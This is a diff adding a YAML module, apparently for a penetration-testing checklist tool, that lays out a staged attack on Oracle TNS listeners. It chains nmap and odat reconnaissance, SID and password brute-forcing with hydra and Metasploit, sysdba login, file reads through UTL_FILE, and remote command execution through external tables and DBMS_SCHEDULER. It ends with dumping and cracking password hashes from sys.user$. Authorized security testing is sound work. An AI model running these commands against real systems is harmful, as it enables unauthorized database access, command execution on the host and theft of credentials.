@@ -1,0 +1,73 @@
+module: oracle
+name: Oracle TNS (1521)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / TNS listener version
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=oracle-tns-version $IP
+      - id: tnscmd
+        text: Query the listener (status / ping / version)
+        commands: |
+          tnscmd10g version -h $IP -p $PORT
+          tnscmd10g status -h $IP -p $PORT
+
+  - id: enum
+    name: SID Enumeration
+    steps:
+      - id: sid_brute
+        text: Enumerate SIDs / service names (needed to connect)
+        commands: |
+          odat sidguesser -s $IP -p $PORT
+          nmap -p$PORT --script=oracle-sid-brute $IP
+          hydra -s $PORT $IP oracle-sid
+      - id: all
+        text: Full automated recon (odat all)
+        commands: |
+          odat all -s $IP -p $PORT
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: default_creds
+        text: Test known default account/password pairs
+        commands: |
+          odat passwordguesser -s $IP -p $PORT -d <SID> --accounts-file /usr/share/odat/accounts/accounts.txt
+      - id: brute
+        text: Brute-force a known account
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST oracle-listener://$IP:$PORT
+          msfconsole -qx "use auxiliary/scanner/oracle/oracle_login; set RHOSTS $IP; set RPORT $PORT; set SID <SID>; run; exit"
+
+  - id: exploit
+    name: Access, RCE & Post-Exploitation
+    steps:
+      - id: sqlplus
+        text: Connect with sqlplus
+        commands: |
+          sqlplus $USER/$PASS@$IP:$PORT/<SID>
+          sqlplus $USER/$PASS@$IP:$PORT/<SID> as sysdba
+      - id: read_file
+        text: Read files from the DB host (UTL_FILE)
+        manual: true
+        commands: |
+          odat utlfile -s $IP -p $PORT -d <SID> -U $USER -P $PASS --getFile <dir> <file> ./out
+      - id: rce_extern
+        text: Command execution (external tables / Java / DBMS_SCHEDULER)
+        manual: true
+        commands: |
+          odat externaltable -s $IP -p $PORT -d <SID> -U $USER -P $PASS --exec <dir> "cmd"
+          odat dbmsscheduler -s $IP -p $PORT -d <SID> -U $USER -P $PASS --exec "id"
+      - id: hashes
+        text: Dump Oracle password hashes for cracking
+        manual: true
+        commands: |
+          # SELECT name, password, spare4 FROM sys.user$;
+          # hashcat -m 3100 (oracle 10) / -m 112 (11g spare4) hashes $PASSLIST
